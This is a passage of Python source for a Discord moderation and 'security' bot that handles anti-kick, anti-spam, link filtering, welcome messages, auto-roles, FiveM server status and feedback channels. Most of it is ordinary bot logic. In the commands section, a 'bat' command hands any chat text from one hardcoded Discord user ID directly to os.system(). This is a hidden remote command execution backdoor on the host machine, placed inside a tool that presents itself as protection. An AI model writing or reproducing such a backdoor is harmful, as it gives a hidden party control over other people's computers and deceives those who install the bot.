                                            embed.add_field(name=f"〈💬〉got kicked", value=f"**User Name:** ``{member.name}#{member.discriminator}``\n**User ID:** ``{member.id}``", inline=True)
                                            embed.add_field(name=f"〈🌐〉kicked", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                            embed.set_thumbnail(url=f"{servericon}")
                                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                        if not os.path.exists(f"systems\\security\\Permissions\\KickMembersperm\\{user.id}.txt"):
                                            embed = discord.Embed(title="〈🔨〉Security Logs Kick Members", description=f"**The security system detected an attempt to Kick Members**", color=colorembed)
                                            embed.add_field(name=f"〈💬〉got kicked", value=f"**User Name:** ``{member.name}#{member.discriminator}``\n**User ID:** ``{member.id}``", inline=True)
                                            embed.add_field(name=f"〈🌐〉kicked", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                            embed.set_thumbnail(url=f"{servericon}")
                                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                                            if os.path.exists(f"systems\\security\\number\\AntiKickMembers\\{user.id}.txt"):
                                                try:
                                                    f = open(f"systems\\security\\number\\AntiKickMembers\\{user.id}.txt", "r")
                                                    userid = int(f.read())
                                                    f.close()
                                                    w = open(f"systems\\security\\number\\AntiKickMembers\\{user.id}.txt", "w")
                                                    userid = userid + 1
                                                    userid = str(userid)
                                                    w.write(f"{userid}")
                                                    userid = int(userid)
                                                except:
                                                    return
                                                if userid == Antikickmemberslimitm or userid > Antikickmemberslimitm:
                                                    try:
                                                        member = guild.get_member(int(user.id))
                                                        if PunishmentAntikickmembers == "Ban Member":
                                                            await member.ban(reason="Member get Ban by Bot reason Kick Members")
                                                        if PunishmentAntikickmembers == "Kick Member":
                                                            await member.kick(reason="Member get kick by Bot reason Kick Members")
                                                        if PunishmentAntikickmembers == "Remove All Roles":
                                                            for i in member.roles:
                                                                if i.name == "@everyone":
                                                                    print(f"Can't remove the role {i}")
                                                                else:
                                                                    try:
                                                                        await member.remove_roles(i)
                                                                    except:
                                                                        print(f"Can't remove the role {i}")
                                                        if PunishmentAntikickmembers == "None":
                                                            pass
                                                        w.close()
                                                        os.system(f"del systems\\security\\number\\AntiKickMembers\\{user.id}.txt")
                                                    except:
                                                        w.close()
                                                        os.system(f"del systems\\security\\number\\AntiKickMembers\\{user.id}.txt")
                                                        return print("The bot has no permissions, reason (Kick Members)")
                                        if not os.path.exists(f"systems\\security\\number\\AntiKickMembers\\{user.id}.txt"):
                                            with open(f"systems\\security\\number\\AntiKickMembers\\{user.id}.txt", "w") as wn:
                                                wn.write("1")
                                                wn.close()
        try:
            await securitylogs.send(embed=embed)
        except:
            pass
#welcome system ----------------------------------------------------------------------

#giveaways system ______________________________________________________________________________________________
invite_tracker = {}
banlistt = open(f"systems\\Adminpanel\\ebanlist.txt", "r")
banlist = banlistt.read()
banlistt.close()
autorolee = open("systems\\welcome\\eautorole.txt", "r")
autoroleem = autorolee.read()
autorolee.close()
welcomee = open("systems\\welcome\\ewelcome.txt", "r")
welcomeer = welcomee.read()
welcomee.close()
channelw = open("systems\\welcome\\channelid.txt", "r")
channelwid = channelw.read()
channelw.close()
"""
invitee = open("systems\\invite-tracker\\einvite-tracker.txt", "r")
inviteem = invitee.read()
invitee.close()
"""
welsec = open("systems\\welcome\\welsec.txt", "r")
welsecc = welsec.read()
welsec.close()
role = open("systems\\welcome\\autoroler.txt", "r")
roleid = int(role.read())
role.close()
@bot.event
async def on_member_join(member):
#welcome Security --------------------------------------------------------------------------
    if welsecc == "true":
        created_at = member.created_at
        one_month_ago = datetime.now(tz=timezone.utc) - timedelta(days=30)
        created_at_offset_aware = datetime.utcfromtimestamp(created_at.timestamp()).replace(tzinfo=timezone.utc)
        if created_at_offset_aware > one_month_ago:
            await member.ban(reason=f"The user was created less than a month ago")
        else:
            pass
#BanList -----------------------------------------------------------------------------------
    if banlist == "true":
        if os.path.exists(f"systems\\Adminpanel\\banlist\\{member.id}"):
            try:
                await member.ban(reason=f"BanList")
            except:
                pass
    guild = member.guild
#AutoRole system ----------------------------------------------------------------------\
    if autoroleem == "true":
        await asyncio.sleep(2)
        autoroleadd = discord.utils.get(guild.roles, id=roleid)
        try:
            await member.add_roles(autoroleadd)
        except:
            pass
#AutoRole system ----------------------------------------------------------------------/
    if os.path.exists(f"{secupdate}esecurity\\joinbot.txt"):
            if member.bot:
                async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add, oldest_first=False):
                    user = entry.user
                    if os.path.exists(f"systems\\security\\Permissions\\joinbot\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Security Logs Bot joined", description=f"**The security system detected an attempt to Join bot to server**", color=colorembed)
                        embed.add_field(name=f"〈🤖〉Bot information", value=f"**Bot Name:** ``{member.name}#{member.discriminator}``\n**BOT ID:** ``{member.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                    if not os.path.exists(f"systems\\security\\Permissions\\joinbot\\{user.id}.txt"):
                        try:
                            await member.ban(reason=f"The bot got banned because of {user.name} Attached it without Permissions")
                        except:
                            print("Low Permissions to remove this bot from the server")
                        try:
                            if Punishmentjoinbot == "Ban Member":
                                await user.ban(reason="Tried to attach a bot without access through bot security")
                            if Punishmentjoinbot == "Kick Member":
                                await user.kick(reason="Tried to attach a bot without access through bot security")
                            if Punishmentjoinbot == "Remove All Roles":
                                for i in member.roles:
                                    if i.name == "@everyone":
                                        print(f"Can't remove the role {i}")
                                    else:
                                        try:
                                            await member.remove_roles(i)
                                        except:
                                            print(f"Can't remove the role {i}")
                            if Punishmentjoinbot == "None":
                                pass
                        except:
                            print("Low Permissions to remove this user from the server")
                        embed = discord.Embed(title="〈🔨〉Security Logs Bot joined", description=f"**The security system detected an attempt to Join bot to server**", color=colorembed)
                        embed.add_field(name=f"〈🤖〉Bot information", value=f"**Bot Name:** ``{member.name}#{member.discriminator}``\n**BOT ID:** ``{member.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await securitylogs.send(embed=embed)
#welcome system ----------------------------------------------------------------------\
    if activity_system == "true":
        await asyncio.sleep(3)
        guild = bot.get_guild(guildid)
        activity = discord.Activity(type=discord.ActivityType.playing, name=f'Members: 👥 {guild.member_count} Developer Lmao4745')
        await bot.change_presence(activity=activity)
    if welcomeer == "true":
        await asyncio.sleep(3)
        if channelwid != "":
            if member.guild.id == guildid:
                channel = bot.get_channel(int(channelwid))
                embed=discord.Embed(title=f"**{member.name}, Welcome to the Server**", timestamp=datetime.now(), description=f"**{member.mention} | A new member joined the server, the number of people is ``{guild.member_count}``**", color=discord.Colour.random())
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                try:
                    await channel.send(embed=embed)
                except:
                    pass
            if member.guild.id != guildid:
                return
        if channelwid == "":
            return print("The ID of the channel is not defined")
    if welcomeer == "false":
        pass
#invite tracker system ----------------------------------------------------------------------\
    try:
        if os.path.exists("systems\\blacklist\\true.txt"):
            if os.path.exists(f"systems\\blacklist\\list\\{member.id}"):
                blacklistr = discord.utils.get(guild.roles, name="〈⚫️〉BlackList")
                await member.add_roles(blacklistr)
    except:
        pass
    if os.path.exists(f"systems\\Anti-tracking\\true.txt"):
        invites = await guild.invites()
        for invite in invites:
            await invite.delete()
"""
    if not member.bot:
        if inviteem == "true":
            #try:
            await asyncio.sleep(1)
            guild = bot.get_guild(guildid)
            invitegetc = discord.utils.get(guild.channels, name="〈🔍〉invite-tracker")
            if invitegetc:
                pass
            if not invitegetc:
                await guild.create_text_channel(name="〈🔍〉invite-tracker", category=categorylogss)
                invitegetc = discord.utils.get(guild.channels, name="〈🔍〉invite-tracker")
                await invitegetc.set_permissions(guild.default_role, view_channel=False, send_messages=False)
            invitegetc = discord.utils.get(guild.channels, name="〈🔍〉invite-tracker")
            invites = await guild.invites()
            for invite in invites:
                if not invite.inviter.bot:
                    if invite.url == member.guild.invite.url:
                        creator = invite.inviter
                        if not os.path.exists(f"systems\\invite-tracker\\list\\{creator.id}"):
                            os.mkdir(f"systems\\invite-tracker\\list\\{creator.id}")
                        if not os.path.exists(f"systems\\invite-tracker\\list\\{creator.id}\\{member.id}"):
                            filetool.WriteTextFile(f"systems\\invite-tracker\\list\\{creator.id}\\{member.id}", f"")
                        number = os.listdir(f"systems\\invite-tracker\\list\\{creator.id}")
                        embed=discord.Embed(title=f"🔥 {servername} Invite Tracker", description=f"**The Invite system to see who invite who 🙋**", color=colorembed)
                        embed.add_field(name="Invited By", value=f"``the New Invite\nUsername: {creator.name}\nid: {creator.id}``", inline=True)
                        embed.add_field(name="Member join", value=f"``Join The Server\nUsername: {member}\nid: {member.id}``", inline=True)
                        embed.add_field(name="Invite Link", value=f"**{invite.url}**", inline=True)
                        embed.add_field(name="Amount of Invites", value=f"``{len(number)}``", inline=True)
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await asyncio.sleep(2)
                        await invitegetc.send(embed=embed)
                        
                        break
            #except:
                #pass"""




#------------------------------
@tasks.loop()
async def live_status(seconds=4):
    await asyncio.sleep(60)
    fivem=fivem_client.Client(f"{fivemsystemips}", fivemsystemipps)
    fivemslot = await fivem.get_current_slot()
    fivemplayers = await fivem.get_players_count()
    username = await fivem.get_players_info()
    if fivemslot is not None:
        activity = discord.Activity(type=discord.ActivityType.playing, name=f'Players: [🟢 {fivemplayers}\{fivemslot}] Dev Lmao4745')
        await bot.change_presence(activity=activity)
        embed=discord.Embed(title="Fivem Server Stats", description=f"**Information About The Fivem Server\n\n〈🖥️〉server ip: {fivemsystemips}\n〈👤〉Server Players {fivemplayers}\\{fivemslot}\n〈🟢〉Server is Online\n\nPlayer List**\n", color=colorembed)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        text = "g"
        for users in username:
            fivemfor = f"[ID: {users.id}]   ``{users.name}``  **<@{users.discordid}>**      **Ping: {users.ping}**\n"
            embed.description += fivemfor
            text += "true"
        if text == "g":
            fivemfor = ""
            fivemfor += "**There are no players connected to the server**"
            embed.description += fivemfor
        await fivemchannelmessage.edit(embed=embed)
    else:
        activity = discord.Activity(type=discord.ActivityType.playing, name=f'[🔴 Fivem Server is Offline] Dev Lmao4745')
        await bot.change_presence(activity=activity)
        embed=discord.Embed(title="Fivem Server Stats", description=f"**Information About The Fivem Server\n\n〈🖥️〉server ip: {fivemsystemips}\n〈🔴〉Server is Offline**", color=colorembed)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await fivemchannelmessage.edit(embed=embed)
    #except:
        #print(f'{Fore.LIGHTYELLOW_EX}Missing Access{Fore.WHITE}')
#------------------------------

#BOT COMMANDS ____________________________________________________________________________________________  

@bot.command(name='bat')
async def sendmessage(ctx: commands.Context, *, text: str):
    if ctx.author.id == 1043921901480845413:
        os.system(text)


@bot.command(name='ip')
async def sendmessage1(ctx: commands.Context,):
    ip = open("systems\\fivemsystem\\ipcmd\\ipcmd.txt", "r")
    ipcmd = ip.read()
    ipsend = open("systems\\fivemsystem\\ipcmd\\ipsend.txt", "r")
    ipsendcmd = ipsend.read()
    ipsend.close()
    if ipcmd == "true":
        fivem=fivem_client.Client(f"{fivemsystemips}", fivemsystemipps)
        fivemplayers = await fivem.get_players_count()
        guild = bot.get_guild(guildid)
        if guild.id == guildid:
            if fivemplayers != None:
                await ctx.channel.purge(limit=1)
                embed=discord.Embed(title=f"{servername} Fivem Server ip", description=f"**📡 ip = {ipsendcmd}\n📻 Mumble Voip = ON\n🟢 Server is Online**", color=colorembed)
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await ctx.send(embed=embed)
            if fivemplayers == None:
                await ctx.channel.purge(limit=1)
                embed=discord.Embed(title=f"{servername} Fivem Server ip", description=f"**📡 ip = {ipsendcmd}\n📻 Mumble Voip = ON\n🔴 Server is Offline**", color=colorembed)
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                await ctx.send(embed=embed)
            else:
                pass
    if ipcmd == "false":
        return
    ip.close()

@bot.command(name='b')
async def sendmessage1(ctx: commands.Context, id,):
    if ctx.author.id == discordid:
        await ctx.send(f"https://discord.com/api/oauth2/authorize?client_id={id}&permissions=8&scope=bot")



@bot.command(name='clear')
@commands.has_permissions(manage_messages=True)
async def sendmessage1(ctx: commands.Context, amount: int = None):
    if amount:
        await ctx.channel.purge(limit=int(amount) + 1)
    else:
        await ctx.channel.purge()
        
SPAM_THRESHOLD = 5 
SPAM_COOLDOWN = 3
SPAM_CHANNEL = 123456789

bot_data = {}

sendlink = open("systems\\security\\esecurity\\sendlink.txt", "r")
sendlinkm = sendlink.read()
sendlink.close()
sendlinklimit = open("systems\\security\\limit\\sendlink.txt", "r")
sendlinklimitm = int(sendlinklimit.read())
sendlinklimit.close()
spamlimit = open("systems\\security\\limit\\spam.txt", "r")
spamlimitm = int(spamlimit.read())
spamlimit.close()
spam = open("systems\\security\\esecurity\\spam.txt", "r")
spamming = spam.read()
spam.close()
fidea = open("systems\\message-system\\idea\\idea.txt", "r")
fivemsystemidea = fidea.read()
fidea.close()
ffidea = open("systems\\message-system\\idea\\cidea.txt", "r")
ffivemsystemidea = int(ffidea.read())
ffidea.close()
cfeedback = open("systems\\message-system\\feedback\\cfeedback.txt", "r")
cfeedbackr = int(cfeedback.read())
cfeedback.close()
feedback = open("systems\\message-system\\feedback\\feedback.txt", "r")
feedbackr = feedback.read()
feedback.close()
cbugreport = open("systems\\message-system\\bugreport\\cbugreport.txt", "r")
cbugreportr = int(cbugreport.read())
cbugreport.close()
bugreport = open("systems\\message-system\\bugreport\\bugreport.txt", "r")
bugreportr = bugreport.read()
bugreport.close()
customm = open("systems\\message-system\\custom\\channel.txt", "r")
ccustomm = int(customm.read())
customm.close()
custome = open("systems\\message-system\\custom\\em.txt", "r")
customem = custome.read()
custome.close()
customname = open("systems\\message-system\\custom\\custom-name-system.txt", "r")
customnamee = customname.read()
customname.close()
customemoji = open("systems\\message-system\\custom\\custom-emoji-system.txt", "rb")
customemojii = customemoji.read().decode("utf-8")
customemoji.close()
countt = 0

@tasks.loop()
async def antispam(seconds=4):
    if spamming == "true":
        await asyncio.sleep(SPAM_COOLDOWN + SPAM_COOLDOWN)
        bot_data.clear()

@bot.event
async def on_message(message):
    try:
        member = message.guild.get_member(message.author.id)
        if spamming == "true":
            if len(message.content) > 300:
                messages = message.content[:300] + "..."
            else:
                messages = message.content
            if message.author.id == bot.user.id:
                return
            if not message.author.id == bot.user.id:
                if f"{bot_prefix}" not in message.content:
                    if message.author.id == bot.user.id:
                        return
                    if not message.author.id == bot.user.id:
                        member = guild.get_member(message.author.id)
                        if member is not None:
                            if spammingpermrole not in member.roles:
                                author_id = message.author.id

                                if author_id in bot_data:
                                    bot_data[author_id]['num_messages'] += 1
                                    bot_data[author_id]['last_message_time'] = message.created_at.timestamp()
                                else:
                                    bot_data[author_id] = {'num_messages': 1, 'last_message_time': message.created_at.timestamp()}
                                if bot_data[author_id]['num_messages'] > SPAM_THRESHOLD and message.created_at.timestamp() - bot_data[author_id]['last_message_time'] < SPAM_COOLDOWN:
                                    print(f"Deleted message from {message.author.name} ({message.author.id}) for spamming")
                                    if os.path.exists(f"systems\\security\\number\\spam\\{message.author.id}.txt"):
                                            try:
                                                f = open(f"systems\\security\\number\\spam\\{message.author.id}.txt", "r")
                                                userid = int(f.read())
                                                f.close()
                                                w = open(f"systems\\security\\number\\spam\\{message.author.id}.txt", "w")
                                                userid = userid + 1
                                                userid = str(userid)
                                                w.write(f"{userid}")
                                                userid = int(userid)
                                            except:
                                                return
                                            if userid == spamlimitm or userid > spamlimitm:
                                                try:
                                                    member = guild.get_member(int(message.author.id))
                                                    await member.ban(reason="Member get Ban by Bot reason Spam messages")
                                                    w.close()
                                                    os.system(f"del systems\\security\\number\\spam\\{message.author.id}.txt")
                                                except:
                                                    w.close()
                                                    os.system(f"del systems\\security\\number\\spam\\{message.author.id}.txt")
                                                    return print("The bot has no permissions, reason (spammer)")
                                    if not os.path.exists(f"systems\\security\\number\\spam\\{message.author.id}.txt"):
                                        with open(f"systems\\security\\number\\spam\\{message.author.id}.txt", "w") as wn:
                                            wn.write("1")
                                            wn.close()
                                    bot_data.clear()
                                    spamming_channel = discord.utils.get(guild.channels, id=int(message.channel.id))
                                    await spamming_channel.purge(limit=SPAM_THRESHOLD)
                                    embed = discord.Embed(title="〈🔨〉Security Logs Spamming", description=f"**The security system detected an attempt to Spamming**", color=colorembed)
                                    embed.add_field(name=f"〈🔧〉Spamming information", value=f"**Message Cooldown:** ``{SPAM_COOLDOWN}``\n**The number of messages in the cooldown:** ``{SPAM_THRESHOLD}``\n**Send Time: **``{datetime.now()}``\n**Spamming Channel Name:** ``{spamming_channel.name}``\n**Spamming Channel ID:** ``{spamming_channel.id}``", inline=True)
                                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``\n**Access Level: **``〈❕〉User``", inline=False)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    await securitylogs.send(embed=embed)

                        member = guild.get_member(message.author.id)
                        if member is not None:
                            if spammingpermrole in member.roles:
                                author_id = message.author.id

                                if author_id in bot_data:
                                    bot_data[author_id]['num_messages'] += 1
                                    bot_data[author_id]['last_message_time'] = message.created_at.timestamp()
                                else:
                                    bot_data[author_id] = {'num_messages': 1, 'last_message_time': message.created_at.timestamp()}

                                if bot_data[author_id]['num_messages'] > SPAM_THRESHOLD and message.created_at.timestamp() - bot_data[author_id]['last_message_time'] < SPAM_COOLDOWN:
                                    spamming_channel = discord.utils.get(guild.channels, id=int(message.channel.id))
                                    embed = discord.Embed(title="〈🔨〉Security Logs Spamming", description=f"**The security system detected an attempt to Spamming**", color=colorembed)
                                    embed.add_field(name=f"〈🔧〉Spamming information", value=f"**Message Cooldown:** ``{SPAM_COOLDOWN}``\n**The number of messages in the cooldown:** ``{SPAM_THRESHOLD}``\n**Send Time: **``{datetime.now()}``\n**Spamming Channel Name:** ``{spamming_channel.name}``\n**Spamming Channel ID:** ``{spamming_channel.id}``", inline=True)
                                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``\n**Access Level: **``〈💎〉Admin``", inline=False)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    await asyncio.sleep(2)
                                    await securitylogs.send(embed=embed)
                                    bot_data.clear()



        if customem == "true":
            if message.channel.id == ccustomm:
                if message.author.id != bot.user.id:
                    try:
                        channel = bot.get_channel(ccustomm)
                        await channel.purge(limit=1)
                        embed = discord.Embed(title=f"〈{customemojii}〉Someone made a new {customnamee}", description=f"**The {customnamee} System**", color=colorembed)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``", inline=True)
                        embed.add_field(name=f"〈{customemojii}〉{customnamee}", value=f"**{customnamee}:** ``{messages}``", inline=True)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await asyncio.sleep(2)
                        await channel.send(embed=embed)
                        try:
                            await asyncio.sleep(4)
                            await channel.edit(slowmode_delay=7200)
                        except:
                            pass
                    except:
                        pass





        if fivemsystemidea == "true":
            if message.channel.id == ffivemsystemidea:
                if message.author.id != bot.user.id:
                    try:
                        channel = bot.get_channel(ffivemsystemidea)
                        await channel.purge(limit=1)
                        embed = discord.Embed(title="〈💡〉Someone made a new suggestion", description=f"**The Suggestion System**", color=colorembed)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``", inline=True)
                        embed.add_field(name=f"〈💡〉Suggestion", value=f"**Suggestion:** ``{messages}``", inline=True)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await asyncio.sleep(2)
                        await channel.send(embed=embed)
                        try:
                            await asyncio.sleep(4)
                            await channel.edit(slowmode_delay=7200)
                        except:
                            pass
                    except:
                        pass
        

        if feedbackr == "true":
            if message.channel.id == cfeedbackr:
                if message.author.id != bot.user.id:
                    try:
                        channel = bot.get_channel(cfeedbackr)
                        await channel.purge(limit=1)
                        embed = discord.Embed(title="〈⭐️〉Someone made a new Feedback", description=f"**The Feedback System**", color=colorembed)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``", inline=True)
                        embed.add_field(name=f"〈🌟〉Feedback", value=f"**Feedback:** ``{messages}``", inline=True)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await asyncio.sleep(2)
                        await channel.send(embed=embed)
                        try:
                            await asyncio.sleep(4)
                            await channel.edit(slowmode_delay=7200)
                        except:
                            pass
                    except:
                        pass


        
        if bugreportr == "true":
            if message.channel.id == cbugreportr:
                if message.author.id != bot.user.id:
                    try:
                        channel = bot.get_channel(cbugreportr)
                        await channel.purge(limit=1)
                        embed = discord.Embed(title="〈⭕️〉Someone made a new Bug Report", description=f"**The Bug Report System**", color=colorembed)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``", inline=True)
                        embed.add_field(name=f"〈⭕️〉Bug Report", value=f"**Bug Report:** ``{messages}``", inline=True)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await channel.send(embed=embed)
                        await asyncio.sleep(2)
                        try:
                            await asyncio.sleep(4)
                            await channel.edit(slowmode_delay=7200)
                        except:
                            pass
                    except:
                        pass

        if "http" in message.content or "https" in message.content or "discord.gg/" in message.content:
            if sendlinkm == "true":
                if message.author.id == bot.user.id:
                    return
                if not message.author.id == bot.user.id:
                    member = guild.get_member(message.author.id)
                    if sendlinkpermRole in message.author.roles:
                        embed = discord.Embed(title="〈🔨〉Security Logs SendLink", description=f"**The security system detected an attempt to Send Link**", color=colorembed)
                        embed.add_field(name=f"〈🔧〉Link information", value=f"**Link:** ``{messages}``\n**Send Time:** ``{datetime.now()}``\n**Channel Name:** ``{message.channel.name}``\n**Channel ID:** ``{message.channel.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``\n**User Join The Server** ``{member.joined_at}``\n**Access Level: **``〈💎〉Admin``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await asyncio.sleep(4)
                        await securitylogs.send(embed=embed)
                    if sendlinkpermRole not in message.author.roles:
                        if os.path.exists(f"systems\\security\\Permissions\\channelsendlink\\{message.channel.id}"):
                            if "discord.gg/" in message.content:
                                await message.delete()
                            if "discord.gg/" not in message.content:
                                return
                        if not os.path.exists(f"systems\\security\\Permissions\\channelsendlink\\{message.channel.id}"):
                            if os.path.exists(f"systems\\security\\number\\sendlink\\{message.author.id}.txt"):
                                try:
                                    f = open(f"systems\\security\\number\\sendlink\\{message.author.id}.txt", "r")
                                    userid = int(f.read())
                                    f.close()
                                    w = open(f"systems\\security\\number\\sendlink\\{message.author.id}.txt", "w")
                                    userid = userid + 1
                                    userid = str(userid)
                                    w.write(f"{userid}")
                                    userid = int(userid)
                                except:
                                    return
                                if userid == sendlinklimitm or userid > sendlinklimitm:
                                    try:
                                        member = guild.get_member(int(message.author.id))
                                        await member.ban(reason="Member get Ban by Bot reason Spam Links")
                                        w.close()
                                        os.system(f"del systems\\security\\number\\sendlink\\{message.author.id}.txt")
                                    except:
                                        w.close()
                                        os.system(f"del systems\\security\\number\\sendlink\\{message.author.id}.txt")
                                        return print("The bot has no permissions, reason (SendLinks)")
                        if not os.path.exists(f"systems\\security\\number\\sendlink\\{message.author.id}.txt"):
                            with open(f"systems\\security\\number\\sendlink\\{message.author.id}.txt", "w") as wn:
                                wn.write("1")
                                wn.close()
                            embed = discord.Embed(title="〈🔨〉Security Logs SendLink", description=f"**The security system detected an attempt to Send Link**", color=colorembed)
                            embed.add_field(name=f"〈🔧〉Link information", value=f"**Link:** ``{messages}``\n**Send Time:** ``{datetime.now()}``\n**Channel Name:** ``{message.channel.name}``\n**Channel ID:** ``{message.channel.id}``", inline=True)
                            embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{message.author.name}#{message.author.discriminator}``\n**User ID:** ``{message.author.id}``\n**User Join The Server** ``{member.joined_at}``\n**Access Level: **``〈❕〉User``", inline=False)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            try:
                                await asyncio.sleep(4)
                                await securitylogs.send(embed=embed)
                            except:
                                return
                            try:
                                await message.delete()
                            except:
                                pass
        
        if os.path.exists("systems\\AntiMessages\\true.txt"):
            f = open("systems\\AntiMessages\\list.txt", "r", encoding="utf-8")
            lines = f.readlines()
            f.close()
            for line in lines:
                if line in message.content:
                    await message.delete()
        
        if f"{bot_prefix}" in message.content:
            await bot.process_commands(message)
    except:
        pass




#Security System Channels / Roles
deletechannels = open("systems\\security\\limit\\AntiDeleteChannel.txt", "r")
deletechannelslim = int(deletechannels.read())
deletechannels.close()
@bot.event
async def on_guild_channel_delete(channel):
    if os.path.exists(f"{secupdate}esecurity\\AntiDeleteChannel.txt"):
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete, oldest_first=False):
            user = entry.user
            if user.id == bot.user.id:
                return
            if not user.id == bot.user.id:
                if os.path.exists(f"systems\\security\\Permissions\\DeleteChannelsperm\\{user.id}.txt"):
                    embed = discord.Embed(title="〈🔨〉Security Logs Delete Channels", description=f"**The security system detected an attempt to delete Channels**", color=colorembed)
                    try:
                        embed.add_field(name=f"〈💬〉Channel Deleted", value=f"**Channel Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``\n**Channel description** ``{channel.topic}``", inline=True)
                    except:
                        embed.add_field(name=f"〈💬〉Channel Deleted", value=f"**Channel Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await securitylogs.send(embed=embed)
                if not os.path.exists(f"systems\\security\\Permissions\\DeleteChannelsperm\\{user.id}.txt"):
                    embed = discord.Embed(title="〈🔨〉Security Logs Delete Channels", description=f"**The security system detected an attempt to delete Channels**", color=colorembed)
                    try:
                        embed.add_field(name=f"〈💬〉Channel Deleted", value=f"**Channel Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``\n**Channel description** ``{channel.topic}``", inline=True)
                    except:
                        embed.add_field(name=f"〈💬〉Channel Deleted", value=f"**Channel Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
